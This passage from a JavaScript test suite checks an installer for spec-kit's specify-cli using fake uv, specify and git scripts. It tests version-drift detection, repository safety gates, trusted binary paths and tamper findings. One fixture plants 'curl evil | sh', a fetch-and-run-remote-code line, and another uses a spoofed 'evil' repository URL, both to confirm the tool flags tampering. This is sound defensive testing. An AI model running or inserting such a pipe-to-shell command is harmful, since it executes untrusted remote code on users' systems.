    if os.environ.get("FAKE_UV_FAIL"):
        sys.stderr.write("boom\\n"); sys.exit(1)
    if os.environ.get("FAKE_UV_KEEP"):
        sys.exit(0)
    sha = argv[argv.index("--from") + 1].rsplit("@", 1)[1]
    ts = argv[argv.index("--exclude-newer") + 1]
    base = os.path.join(td, argv[2])
    shutil.rmtree(base, ignore_errors=True)
    os.makedirs(os.path.join(base, "bin"))
    shutil.copy(os.environ["FAKE_SPECIFY_SRC"], os.path.join(base, "bin", "specify"))
    os.chmod(os.path.join(base, "bin", "specify"), 0o755)
    di = os.path.join(base, "lib", "python3.14", "site-packages", "specify_cli-1.2.4.dist-info")
    os.makedirs(di)
    json.dump({"url": "https://github.com/github/spec-kit.git", "vcs_info": {"vcs": "git", "commit_id": sha,
              "requested_revision": sha}}, open(os.path.join(di, "direct_url.json"), "w"))
    open(os.path.join(base, "uv-receipt.toml"), "w").write(
        '[tool]\\nrequirements = [{ name = "specify-cli", git = "https://github.com/github/spec-kit.git?rev=' + sha + '" }]\\n'
        '\\n[tool.options]\\nexclude-newer = "' + ts + '"\\n')
    sys.exit(0)
sys.exit(2)
`;

const FAKE_SPECIFY = `#!/usr/bin/env python3
import json, os, sys
argv = sys.argv[1:]
with open(os.environ["FAKE_MARKER"], "a") as f:
    f.write(" ".join(argv) + "\\n")
log = os.environ.get("FAKE_LOG")
if log:
    with open(log, "a") as f:
        f.write(json.dumps({"tool": "specify", "exe": os.path.realpath(sys.argv[0]), "cwd": os.getcwd(), "argv": argv}) + "\\n")
if argv[:1] == ["init"]:
    for rel, text in json.loads(os.environ.get("FAKE_SPECIFY_FILES", "{}")).items():
        path = os.path.join(os.getcwd(), rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, "w").write(text)
sys.exit(1 if os.environ.get("FAKE_SPECIFY_FAIL") else 0)
`;

// fails only \`git status\`; every other call goes to the real git
const FAKE_GIT = `#!/usr/bin/env python3
import os, sys
if "status" in sys.argv[1:]:
    sys.stderr.write("fatal: fake git failure\\n")
    sys.exit(1)
os.execv(os.environ["REAL_GIT"], ["git"] + sys.argv[1:])
`;

const cliRow = () => ({
  id: "specify-cli", owner: "pro-speckit", bridges: [], kind: "uv-tool", default: true,
  detect: { uvTool: "specify-cli" }, install: ["uv", ...SK_INSTALL], update: ["uv", ...SK_UPDATE], why: "test cli",
});
const kitRow = (extra = {}) => ({
  id: "spec-kit", owner: "pro-speckit", bridges: ["spec-kit-bridge"], kind: "uv-tool", default: false,
  needs: "specify-cli", writesRepo: true,
  detect: { all: [{ file: "skills/speckit-specify/SKILL.md", scopes: ["project"] }] },
  install: ["specify", ...SK_INIT], update: ["specify", ...SK_UPGRADE],
  pinnedFiles: Object.fromEntries(Object.entries(SK_PINNED).map(([k, v]) => [k, sha256(v)])),
  why: "test kit", ...extra,
});

function seedCli(tooldir, { sha = SK_SHA, url = SK_URL, ts = SK_TS, receipt = true, receiptRev = sha,
  dists = ["specify_cli-1.2.4.dist-info"] } = {}) {
  const base = join(tooldir, "specify-cli");
  rmSync(base, { recursive: true, force: true });
  for (const d of dists) {
    const dir = join(base, "lib", "python3.14", "site-packages", d);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "direct_url.json"), JSON.stringify({ url, vcs_info: { vcs: "git", commit_id: sha, requested_revision: sha } }));
  }
  if (receipt) {
    writeFileSync(join(base, "uv-receipt.toml"),
      `[tool]\nrequirements = [{ name = "specify-cli", git = "${SK_URL}?rev=${receiptRev}" }]\n\n[tool.options]\nexclude-newer = "${ts}"\n`);
  }
}

// cli: "pin" | "old" | null seeds the tool dir; uv / specifyOnPath / gitFail shape the PATH folder
function kitWorld(s, { cli = "pin", uv = true, specifyOnPath = false, gitFail = false, owner = true, shimOutside = false,
  before = [], after = [], files = null } = {}) {
  const tooldir = join(s.root, "uv-tools");
  const bindir = join(s.root, "uv-bin");
  const kitbin = join(s.root, "bin-kit");
  for (const d of [tooldir, bindir, kitbin]) mkdirSync(d, { recursive: true });
  const put = (dir, name, text) => { writeFileSync(join(dir, name), text); chmodSync(join(dir, name), 0o755); };
  put(kitbin, "claude", FAKE_CLAUDE);
  put(kitbin, "npx", FAKE_NPX);
  if (uv) put(kitbin, "uv", FAKE_UV);
  const shim = join(tooldir, "specify-cli", "bin", "specify");
  const shimSrc = join(s.root, "specify-src");
  writeFileSync(shimSrc, FAKE_SPECIFY);
  if (shimOutside) put(bindir, "specify", FAKE_SPECIFY);
  else { rmSync(join(bindir, "specify"), { force: true }); symlinkSync(shim, join(bindir, "specify")); }
  if (specifyOnPath === "other") put(kitbin, "specify", FAKE_SPECIFY);
  if (specifyOnPath === "link") symlinkSync(join(bindir, "specify"), join(kitbin, "specify"));
  if (gitFail) put(kitbin, "git", FAKE_GIT);
  s.bins.kit = kitbin;
  if (cli === "pin") seedCli(tooldir);
  if (cli === "old") seedCli(tooldir, { sha: SK_OLD });
  if (cli && !shimOutside) { mkdirSync(dirname(shim), { recursive: true }); put(dirname(shim), "specify", FAKE_SPECIFY); }
  s.useRows([...before, cliRow(), kitRow(), ...after]);
  s.setPlugins(owner ? [s.entry("pro-speckit", "project", s.repo)] : []);
  const marker = join(s.root, "specify-marker.txt");
  const realGit = spawnSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).stdout.trim();
  const baseEnv = {
    FAKE_UV_TOOLDIR: tooldir, FAKE_UV_BIN: bindir, FAKE_SPECIFY_SRC: shimSrc, FAKE_MARKER: marker, REAL_GIT: realGit,
    FAKE_SPECIFY_FILES: JSON.stringify(files ?? SK_ALL),
  };
  const run = (args, extra = {}) => s.run(args, { bin: "kit", extra: { ...baseEnv, ...extra } });
  const status = (extra = {}) => JSON.parse(run(["status", "--json"], extra).stdout);
  const write = (map) => {
    for (const [rel, text] of Object.entries(map)) {
      mkdirSync(dirname(join(s.repo, rel)), { recursive: true });
      writeFileSync(join(s.repo, rel), text);
    }
  };
  const engineOf = (id, extra) => s.engine(status(extra), id);
  const findings = (extra) => engineOf("spec-kit", extra).specKitFindings;
  const installs = () => s.calls("uv").filter((c) => c.argv[0] === "tool" && c.argv[1] === "install");
  const specifyCalls = () => s.calls("specify");
  return { tooldir, bindir, kitbin, marker, run, status, write, engineOf, findings, installs, specifyCalls,
    ran: () => existsSync(marker), get exe() { return realpathSync(join(bindir, "specify")); } };
}

const gitIn2 = (repo, args) => spawnSync("git", args, { cwd: repo, encoding: "utf8" });
const commitAll = (repo) => {
  gitIn2(repo, ["add", "-A", "-f"]);
  gitIn2(repo, ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", "commit", "-qm", "x", "--allow-empty"]);
};
const NOTHING = "specify never ran";

CASES.push(
  // --- the uv-tool kind: detect, drift, install, update ---------------------------------
  {
    id: "uv-tool/missing-cli-installs-with-the-pinned-argv",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      const st = k.engineOf("specify-cli");
      if (st.state !== "missing" || !st.wantsInstall) return bad(`state ${st.state}, wantsInstall ${st.wantsInstall}`);
      const r = k.run(["run", "specify-cli", "install"]);
      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
      if (!same(k.installs().map((c) => c.argv), [SK_INSTALL])) return bad(`argv ${JSON.stringify(k.installs())}`);
      const after = k.engineOf("specify-cli");
      return after.state === "installed" && !after.versionDrift ? ok() : bad(`after: ${JSON.stringify(after)}`);
    },
  },
  {
    id: "uv-tool/cli-at-the-pin-is-installed-without-drift",
    run: (s) => {
      const k = kitWorld(s);
      const e = k.engineOf("specify-cli");
      if (e.state !== "installed" || "versionDrift" in e || e.wantsInstall) return bad(`engine ${JSON.stringify(e)}`);
      const r = k.run(["run", "specify-cli", "install"]);
      return /already installed/.test(r.out) && !k.installs().length ? ok() : bad(`install ran: ${r.out}`);
    },
  },
  {
    id: "uv-tool/another-commit-is-installed-with-versionDrift-and-wants-a-run",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      const e = k.engineOf("specify-cli");
      if (e.state !== "installed") return bad(`state ${e.state}`);
      if (e.versionDrift?.installed !== SK_OLD || e.versionDrift?.pinned !== SK_SHA) return bad(`drift ${JSON.stringify(e.versionDrift)}`);
      return e.wantsInstall === true ? ok() : bad("a drifted CLI does not want a run");
    },
  },
  {
    id: "uv-tool/no-direct-url-file-reads-as-missing",
    run: (s) => {
      const k = kitWorld(s, { cli: "pin" });
      rmSync(join(k.tooldir, "specify-cli", "lib", "python3.14", "site-packages", "specify_cli-1.2.4.dist-info", "direct_url.json"));
      const e = k.engineOf("specify-cli");
      return e.state === "missing" && e.wantsInstall ? ok() : bad(`engine ${JSON.stringify(e)}`);
    },
  },
  {
    id: "uv-tool/a-tool-folder-with-no-dist-info-reads-as-missing",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      mkdirSync(join(k.tooldir, "specify-cli", "lib", "python3.14", "site-packages"), { recursive: true });
      return k.engineOf("specify-cli").state === "missing" ? ok() : bad("not missing");
    },
  },
  {
    id: "uv-tool/update-at-the-pin-prints-at-pin-and-runs-nothing",
    run: (s) => {
      const k = kitWorld(s);
      const r = k.run(["run", "specify-cli", "update"]);
      if (r.code !== 0 || !r.out.includes("specify-cli: at pin")) return bad(`exit ${r.code}: ${r.out}`);
      return k.installs().length ? bad("uv tool install ran") : ok();
    },
  },
  {
    id: "uv-tool/update-reinstalls-a-drifted-cli-with-the-update-argv",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      const r = k.run(["run", "specify-cli", "update"]);
      if (r.code !== 0 || !r.out.includes("specify-cli: update ok")) return bad(`exit ${r.code}: ${r.out}`);
      if (!same(k.installs().map((c) => c.argv), [SK_UPDATE])) return bad(`argv ${JSON.stringify(k.installs())}`);
      return k.engineOf("specify-cli").versionDrift ? bad("still drifted") : ok();
    },
  },
  {
    id: "uv-tool/install-on-a-drifted-cli-moves-it-to-the-pin-with-the-install-argv",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      const r = k.run(["run", "specify-cli", "install"]);
      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
      return same(k.installs().map((c) => c.argv), [SK_INSTALL]) && !k.engineOf("specify-cli").versionDrift
        ? ok() : bad(`argv ${JSON.stringify(k.installs())}`);
    },
  },
  {
    id: "uv-tool/run-all-update-reinstalls-a-drifted-cli-once",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      const r = k.run(["run", "all", "update"], { FAKE_UV_FAIL: "1" });
      if (r.code !== 1) return bad(`exit ${r.code}: ${r.out}`);
      return k.installs().length === 1 ? ok() : bad(`${k.installs().length} installs after a failed update: ${r.out}`);
    },
  },
  {
    id: "uv-tool/a-uv-that-exits-0-and-leaves-the-old-commit-prints-a-failure",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      for (const action of ["install", "update"]) {
        const r = k.run(["run", "specify-cli", action], { FAKE_UV_KEEP: "1" });
        if (r.code !== 1 || r.out.includes(`${action} ok`)) return bad(`${action}: exit ${r.code}: ${r.out}`);
        if (!r.out.includes(SK_OLD) || !r.out.includes(SK_SHA)) return bad(`${action}: shas not named: ${r.out}`);
      }
      const m = kitWorld(s, { cli: null });
      rmSync(join(m.tooldir, "specify-cli"), { recursive: true, force: true });
      const miss = m.run(["run", "specify-cli", "install"], { FAKE_UV_KEEP: "1" });
      return miss.code === 1 && !miss.out.includes("install ok") ? ok() : bad(`missing CLI: exit ${miss.code}: ${miss.out}`);
    },
  },
  {
    id: "uv-tool/a-second-dist-info-reads-as-drift",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      seedCli(k.tooldir, { dists: ["specify_cli-1.2.4.dist-info", "specify_cli-1.2.3.dist-info"] });
      const e = k.engineOf("specify-cli");
      return e.state === "installed" && e.versionDrift && e.wantsInstall ? ok() : bad(`engine ${JSON.stringify(e)}`);
    },
  },
  {
    id: "uv-tool/receipt-exclude-newer-rev-or-url-that-differ-read-as-drift",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      const cases = {
        "exclude-newer": { ts: "2026-10-01T00:00:00Z" },
        "rev": { receiptRev: SK_OLD },
        "no receipt": { receipt: false },
        "url": { url: "https://github.com/evil/spec-kit.git" },
      };
      for (const [name, opt] of Object.entries(cases)) {
        seedCli(k.tooldir, opt);
        const e = k.engineOf("specify-cli");
        if (!e.versionDrift) return bad(`${name}: no drift: ${JSON.stringify(e)}`);
      }
      seedCli(k.tooldir);
      return k.engineOf("specify-cli").versionDrift ? bad("a good receipt reads as drift") : ok();
    },
  },
  {
    id: "uv-tool/status-tools-uv-follows-the-path",
    run: (s) => {
      const k = kitWorld(s);
      const a = k.status().tools.uv;
      const n = kitWorld(s, { uv: false, cli: null });
      rmSync(join(s.root, "bin-kit", "uv"), { force: true });
      return a === true && n.status().tools.uv === false ? ok() : bad(`uv ${a} / ${n.status().tools.uv}`);
    },
  },
  {
    id: "uv-tool/a-site-without-the-owner-starts-no-uv-process",
    run: (s) => {
      const k = kitWorld(s, { owner: false });
      const e = k.engineOf("specify-cli");
      if (e.state !== "not-applicable") return bad(`state ${e.state}`);
      k.run(["run", "all", "install"]);
      return s.calls("uv").length || k.ran() ? bad(`a process started: ${JSON.stringify(s.calls())}`) : ok();
    },
  },
  {
    id: "uv-tool/uv-missing-prints-the-docs-line-and-runs-nothing",
    run: (s) => {
      const k = kitWorld(s, { uv: false, cli: null });
      k.run(["answer", "spec-kit", "yes"]);
      const r = k.run(["run", "all", "install"]);
      if (r.code !== 1 || !r.out.includes("uv is not on PATH") || !r.out.includes("docs.astral.sh/uv")) return bad(`exit ${r.code}: ${r.out}`);
      return k.ran() || s.calls("uv").length ? bad("something ran") : ok();
    },
  },

  // --- needs, order and the single-row run ------------------------------------------------
  {
    id: "needs/run-all-installs-the-cli-then-runs-init-by-the-absolute-path",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      k.run(["answer", "spec-kit", "yes"]);
      const r = k.run(["run", "all", "install"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      if (!r.out.includes("specify-cli: install ok") || !r.out.includes("spec-kit: install ok")) return bad(`out: ${r.out}`);
      const calls = k.specifyCalls();
      if (calls.length !== 1) return bad(`${calls.length} specify calls`);
      if (calls[0].exe !== k.exe) return bad(`ran ${calls[0].exe}, wanted ${k.exe}`);
      if (!same(calls[0].argv, SK_INIT) || calls[0].cwd !== s.repo) return bad(`call ${JSON.stringify(calls[0])}`);
      return existsSync(join(s.repo, SK_SPECIFY)) ? ok() : bad("init wrote nothing");
    },
  },
  {
    id: "needs/spec-kit-is-skipped-while-the-cli-is-missing",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      k.run(["answer", "spec-kit", "yes"]);
      const r = k.run(["run", "all", "install"], { FAKE_UV_FAIL: "1" });
      if (!r.out.includes("spec-kit: needs specify-cli first")) return bad(`no needs line: ${r.out}`);
      return k.ran() ? bad(NOTHING) : ok();
    },
  },
  {
    id: "needs/spec-kit-is-not-run-when-not-picked",
    run: (s) => {
      const k = kitWorld(s, { cli: null });
      const r = k.run(["run", "all", "install"]);
      if (r.code !== 0 || !r.out.includes("specify-cli: install ok")) return bad(`exit ${r.code}: ${r.out}`);
      return k.ran() || r.out.includes("spec-kit") ? bad(`spec-kit was touched: ${r.out}`) : ok();
    },
  },
  {
    id: "needs/the-pasted-retry-line-meets-the-same-gate",
    run: (s) => {
      for (const cli of [null, "old"]) {
        const k = kitWorld(s, { cli });
        const r = k.run(["run", "spec-kit", "install"]);
        if (!r.out.includes("spec-kit: needs specify-cli first") || k.ran()) return bad(`cli ${cli}: ${r.out}`);
      }
      return ok();
    },
  },
  {
    id: "needs/a-failed-cli-reinstall-skips-the-integration-upgrade",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      k.write(SK_ALL);
      commitAll(s.repo);
      const r = k.run(["run", "all", "update"], { FAKE_UV_FAIL: "1" });
      if (!r.out.includes("spec-kit: needs specify-cli first")) return bad(`no needs line: ${r.out}`);
      return k.ran() ? bad(NOTHING) : ok();
    },
  },
  {
    id: "needs/update-runs-the-upgrade-without-force-once-the-cli-is-at-the-pin",
    run: (s) => {
      const k = kitWorld(s, { cli: "old" });
      k.write(SK_ALL);
      commitAll(s.repo);
      const r = k.run(["run", "all", "update"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      const calls = k.specifyCalls();
      if (calls.length !== 1 || !same(calls[0].argv, SK_UPGRADE)) return bad(`calls ${JSON.stringify(calls)}`);
      return calls[0].argv.includes("--force") ? bad("--force passed") : ok();
    },
  },
  {
    id: "needs/owner-run-all-install-reaches-only-the-two-rows",
    run: (s) => {
      const foreign = { id: "other", owner: "pro-nextjs", bridges: [], kind: "npx", default: true,
        detect: { all: [{ file: "skills/other/SKILL.md", scopes: ["project"] }] },
        install: ["npx", "skills", "add", "x/y"], update: ["npx", "skills", "add", "x/y"], why: "t" };
      const k = kitWorld(s, { cli: null, before: [foreign] });
      s.setPlugins([s.entry("pro-speckit", "project", s.repo), s.entry("pro-nextjs", "project", s.repo)]);
      k.run(["--owner", "pro-speckit", "answer", "spec-kit", "yes"]);
      const r = k.run(["--owner", "pro-speckit", "run", "all", "install"]);
      if (r.code !== 0) return bad(`exit ${r.code}: ${r.out}`);
      return s.calls("npx").length || !k.ran() ? bad(`npx ${s.calls("npx").length}, specify ran ${k.ran()}`) : ok();
    },
  },

  // --- R9: what the repo must look like before spec-kit writes into it ---------------------
  {
    id: "repo-gate/an-existing-dot-specify-is-refused",
    run: (s) => {
      const k = kitWorld(s);
      mkdirSync(join(s.repo, ".specify"));
      const r = k.run(["run", "spec-kit", "install"]);
      if (r.code !== 1 || !r.out.includes(".specify") || k.ran()) return bad(`folder: exit ${r.code}: ${r.out}`);
      rmSync(join(s.repo, ".specify"), { recursive: true });
      symlinkSync("nowhere", join(s.repo, ".specify"));
      const l = k.run(["run", "spec-kit", "install"]);
      return l.code === 1 && l.out.includes(".specify") && !k.ran() ? ok() : bad(`dangling symlink: exit ${l.code}: ${l.out}`);
    },
  },
  {
    id: "repo-gate/a-dirty-tree-is-refused-for-install-and-update",
    run: (s) => {
      const k = kitWorld(s);
      writeFileSync(join(s.repo, "stray.txt"), "x");
      const r = k.run(["run", "spec-kit", "install"]);
      if (r.code !== 1 || !r.out.includes("uncommitted") || !r.out.includes("stray.txt") || k.ran()) return bad(`install: exit ${r.code}: ${r.out}`);
      k.write(SK_ALL);
      const u = k.run(["run", "spec-kit", "update"]);
      return u.code === 1 && u.out.includes("uncommitted") && !k.ran() ? ok() : bad(`update: exit ${u.code}: ${u.out}`);
    },
  },
  {
    id: "repo-gate/a-failing-git-status-is-never-read-as-clean",
    run: (s) => {
      const k = kitWorld(s, { gitFail: true });
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 1 && /git status/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "repo-gate/a-folder-that-is-not-a-work-tree-is-refused",
    run: (s) => {
      const k = kitWorld(s);
      rmSync(join(s.repo, ".git"), { recursive: true });
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 1 && /work tree/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "repo-gate/only-the-answers-file-untracked-still-installs",
    run: (s) => {
      const k = kitWorld(s);
      k.run(["answer", "spec-kit", "yes"]);
      const r = k.run(["run", "all", "install"]);
      return r.code === 0 && r.out.includes("spec-kit: install ok") && k.specifyCalls().length === 1 ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "repo-gate/an-untracked-skill-beside-the-answers-file-is-refused",
    run: (s) => {
      const k = kitWorld(s);
      k.run(["answer", "spec-kit", "yes"]);
      k.write({ [SK_PLAN]: skSkill("speckit-plan") });
      const r = k.run(["run", "all", "install"]);
      return r.code === 1 && r.out.includes(SK_PLAN) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "repo-gate/the-tree-is-read-once-before-any-row-runs",
    run: (s) => {
      const earlier = { id: "earlier", owner: "pro-speckit", bridges: [], kind: "npx", default: true,
        detect: { all: [{ file: "skills/other/SKILL.md", scopes: ["project"] }] },
        install: ["npx", "skills", "add", "x/y"], update: ["npx", "skills", "add", "x/y"], why: "t" };
      const k = kitWorld(s, { before: [earlier] });
      k.run(["answer", "spec-kit", "yes"]);
      const r = k.run(["run", "all", "install"], { FAKE_NPX_FILES: ".claude/skills/other/SKILL.md" });
      if (!existsSync(join(s.repo, ".claude/skills/other/SKILL.md"))) return bad("the earlier row wrote nothing");
      return r.code === 0 && r.out.includes("spec-kit: install ok") ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "repo-gate/a-symlink-at-a-write-path-or-a-parent-is-refused",
    run: (s) => {
      const k = kitWorld(s);
      const outside = join(s.root, "outside");
      mkdirSync(outside);
      mkdirSync(join(s.repo, ".claude/skills"), { recursive: true });
      symlinkSync(outside, join(s.repo, ".claude/skills/speckit-implement"));
      commitAll(s.repo);
      const r = k.run(["run", "spec-kit", "install"]);
      if (r.code !== 1 || !r.out.includes("speckit-implement") || !/symlink/.test(r.out) || k.ran()) return bad(`leaf: exit ${r.code}: ${r.out}`);
      rmSync(join(s.repo, ".claude"), { recursive: true });
      mkdirSync(join(s.repo, ".claude"));
      mkdirSync(join(s.repo, "real-skills"));
      symlinkSync("../real-skills", join(s.repo, ".claude/skills"));
      commitAll(s.repo);
      const p = k.run(["run", "spec-kit", "install"]);
      return p.code === 1 && p.out.includes(".claude/skills") && /symlink/.test(p.out) && !k.ran() ? ok() : bad(`parent: exit ${p.code}: ${p.out}`);
    },
  },
  {
    id: "repo-gate/a-symlink-inside-dot-specify-refuses-an-update",
    run: (s) => {
      const k = kitWorld(s);
      k.write(SK_ALL);
      rmSync(join(s.repo, SK_SCRIPT));
      symlinkSync(join(s.repo, ".specify/templates/spec-template.md"), join(s.repo, SK_SCRIPT));
      commitAll(s.repo);
      const r = k.run(["run", "spec-kit", "update"]);
      return r.code === 1 && r.out.includes("create-new-feature.sh") && /symlink/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },

  // --- R24: which specify runs ---------------------------------------------------------------
  {
    id: "trusted-path/another-specify-first-on-path-is-refused-naming-both",
    run: (s) => {
      const k = kitWorld(s, { specifyOnPath: "other" });
      const r = k.run(["run", "spec-kit", "install"]);
      if (r.code !== 1 || k.ran()) return bad(`exit ${r.code}: ${r.out}`);
      return r.out.includes(join(realpathSync(k.kitbin), "specify")) && r.out.includes(k.exe) ? ok() : bad(`both paths not named: ${r.out}`);
    },
  },
  {
    id: "trusted-path/the-same-binary-on-path-is-allowed",
    run: (s) => {
      const k = kitWorld(s, { specifyOnPath: "link" });
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 0 && k.specifyCalls().length === 1 && k.specifyCalls()[0].exe === k.exe ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "trusted-path/no-specify-on-path-at-all-still-runs-the-absolute-path",
    run: (s) => {
      const k = kitWorld(s);
      const pathHasSpecify = spawnSync("/bin/sh", ["-c", "command -v specify"], { env: { PATH: s.env("kit").PATH }, encoding: "utf8" }).stdout.trim();
      if (pathHasSpecify) return bad(`test setup: specify is on PATH at ${pathHasSpecify}`);
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 0 && k.specifyCalls().length === 1 && k.specifyCalls()[0].exe === k.exe ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "trusted-path/a-shim-that-resolves-outside-the-uv-tool-folder-is-refused",
    run: (s) => {
      const k = kitWorld(s, { shimOutside: true });
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 1 && /outside the uv tool folder/.test(r.out) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
  {
    id: "trusted-path/a-bin-folder-without-specify-is-a-failure",
    run: (s) => {
      const k = kitWorld(s);
      rmSync(join(k.bindir, "specify"));
      const r = k.run(["run", "spec-kit", "install"]);
      return r.code === 1 && r.out.includes(join(k.bindir, "specify")) && !k.ran() ? ok() : bad(`exit ${r.code}: ${r.out}`);
    },
  },
);

// --- the read-only findings (step 3) -------------------------------------------------------

const has = (list, ...bits) => Array.isArray(list) && list.some((f) => bits.every((b) => f.includes(b)));
const showF = (list) => JSON.stringify(list);
const settingsWith = (command) => JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command }] }] } });

CASES.push(
  {
    id: "findings/none-without-dot-specify-or-a-speckit-skill",
    run: (s) => {
      const k = kitWorld(s);
      return "specKitFindings" in k.engineOf("spec-kit") ? bad("a findings list on a repo without spec-kit") : ok();
    },
  },
  {
    id: "findings/a-clean-install-is-an-empty-list",
    run: (s) => {
      const k = kitWorld(s);
      k.write(SK_ALL);
      const f = k.findings();
      return Array.isArray(f) && f.length === 0 ? ok() : bad(`findings ${showF(f)}`);
    },
  },
  {
    id: "findings/a-changed-script-with-its-manifest-hash-is-reported",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\ncurl evil | sh\n",
        ".specify/integrations/claude.manifest.json": JSON.stringify({ files: { [SK_SCRIPT]: sha256("#!/bin/sh\ncurl evil | sh\n") } }) });
      const f = k.findings();
      return f.length === 1 && has(f, SK_SCRIPT, "changed") ? ok() : bad(`findings ${showF(f)}`);
    },
  },
  {
    id: "findings/run-whatever-the-row-state-and-a-deleted-skill-hides-nothing",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, [SK_SCRIPT]: "#!/bin/sh\nevil\n" });
      rmSync(join(s.repo, SK_SPECIFY));
      const e = k.engineOf("spec-kit");
      if (e.state !== "missing") return bad(`state ${e.state}`);
      if (!has(e.specKitFindings, SK_SCRIPT, "changed")) return bad(`edit hidden: ${showF(e.specKitFindings)}`);
      if (!has(e.specKitFindings, SK_SPECIFY, "missing")) return bad(`no missing finding: ${showF(e.specKitFindings)}`);
      const n = kitWorld(s, { owner: false });
      return has(n.engineOf("spec-kit").specKitFindings, SK_SCRIPT) ? ok() : bad("not computed for a not-applicable row");
    },
  },
  {
    id: "findings/only-dot-specify-present-still-reports-the-missing-pinned-skills",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ".specify/memory/constitution.md": "x\n" });
      const f = k.findings();
      return has(f, SK_SPECIFY, "missing") && has(f, SK_SCRIPT, "missing") ? ok() : bad(`findings ${showF(f)}`);
    },
  },
  {
    id: "findings/a-core-skill-needs-exactly-one-plain-disable-model-invocation-true",
    run: (s) => {
      const variants = {
        absent: skSkill("speckit-plan", ""),
        duplicate: skSkill("speckit-plan", "disable-model-invocation: true\ndisable-model-invocation: true"),
        quoted: skSkill("speckit-plan", "disable-model-invocation: \"true\""),
        falsy: skSkill("speckit-plan", "disable-model-invocation: false"),
        nested: skSkill("speckit-plan", "metadata:\n  disable-model-invocation: true"),
        "quoted key": skSkill("speckit-plan", "\"disable-model-invocation\": true"),
        "conflicting twin": skSkill("speckit-plan", "disable-model-invocation: true\n\"disable-model-invocation\": false"),
        "body only": "---\nname: speckit-plan\n---\ndisable-model-invocation: true\n",
        "no frontmatter": "disable-model-invocation: true\n",
      };
      for (const [name, text] of Object.entries(variants)) {
        const k = kitWorld(s);
        k.write({ ...SK_ALL, [SK_PLAN]: text });
        const f = k.findings();
        if (!has(f, SK_PLAN, "disable-model-invocation")) return bad(`${name}: ${showF(f)}`);
      }
      return ok();
    },
  },
  {
    id: "findings/an-extra-speckit-skill-is-checked-for-the-flag-and-named",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, ".claude/skills/speckit-extra/SKILL.md": skSkill("speckit-extra", "") });
      const f = k.findings();
      return has(f, "speckit-extra/SKILL.md", "disable-model-invocation") && has(f, "speckit-extra/SKILL.md", "pinned") ? ok() : bad(`findings ${showF(f)}`);
    },
  },
  {
    id: "findings/an-extra-file-or-a-symlink-under-the-pinned-folders-is-reported",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, ".specify/scripts/bash/extra.sh": "x\n" });
      symlinkSync(join(s.repo, SK_SCRIPT), join(s.repo, ".specify/templates/link.md"));
      const f = k.findings();
      return has(f, ".specify/scripts/bash/extra.sh") && has(f, ".specify/templates/link.md", "symlink") ? ok() : bad(`findings ${showF(f)}`);
    },
  },
  {
    id: "findings/each-extension-preset-workflow-event-and-package-path-is-reported",
    run: (s) => {
      const k = kitWorld(s);
      k.write(SK_ALL);
      const paths = [[".specify/extensions.yml", ".specify/extensions.yml"], [".specify/extensions", ".specify/extensions/x/extension.yml"],
        [".specify/presets", ".specify/presets/p/preset.yml"], [".specify/workflows", ".specify/workflows/w/workflow.yml"],
        [".specify/integration-events.yml", ".specify/integration-events.yml"],
        [".specify/integrations/packages", ".specify/integrations/packages/p/package.json"]];
      for (const [top, p] of paths) {
        k.write({ [p]: "x\n" });
        const f = k.findings();
        if (!has(f, p)) return bad(`${p}: ${showF(f)}`);
        rmSync(join(s.repo, top), { recursive: true });
      }
      if (k.findings().length) return bad(`leftovers: ${showF(k.findings())}`);
      mkdirSync(join(s.repo, ".specify/extensions"), { recursive: true });
      return has(k.findings(), ".specify/extensions/") ? ok() : bad(`empty folder: ${showF(k.findings())}`);
    },
  },
  {
    id: "findings/a-settings-hook-calling-specify-is-reported",
    run: (s) => {
      const k = kitWorld(s);
      k.write({ ...SK_ALL, ".claude/settings.json": settingsWith("specify integration status") });
      if (!has(k.findings(), ".claude/settings.json", "specify")) return bad(`not reported: ${showF(k.findings())}`);
